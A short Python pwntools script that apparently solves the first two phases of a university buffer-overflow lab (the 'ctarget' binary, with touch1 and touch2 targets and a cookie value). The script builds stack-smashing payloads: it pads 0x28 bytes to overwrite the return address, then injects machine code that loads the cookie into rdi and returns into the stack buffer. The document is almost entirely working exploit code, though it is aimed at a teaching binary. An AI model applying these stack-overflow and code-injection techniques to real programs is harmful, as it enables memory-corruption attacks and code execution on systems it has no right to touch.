from pwn import *

def set_p64(addr):
    return p64(addr).decode("iso-8859-1")

cookie = 0x59b997fa
touch1 = 0x4017c0
touch2 = 0x4017ec
touch3 = 0x4018fa

ctarget = ["./ctarget", "-q"]

# touch 1
p = process(ctarget)
input("# touch1")

junk_size = 0x28
junk = "a" * 0x28

payload = junk + set_p64(touch1)

p.sendline(payload)
print(str(p.recv(), "ascii"))

# touch 2
p = process(ctarget)
input("# touch2")

input_buf_addr = 0x5561dc78
pop_rdi_ret = 0x40141b

# mov rdi, cookie
# pop rax // for alignment
# ret
mov_pop = 0x5859b997fac7c748
ret = 0xc3
cmd_p64 = set_p64(mov_pop) + set_p64(ret)
junk = "a" * (junk_size - len(cmd_p64))
payload = cmd_p64 + junk + set_p64(input_buf_addr) + set_p64(0) + set_p64(touch2)

p.sendline(payload)
print(str(p.recv(), "ascii"))

# p = process(ctarget)
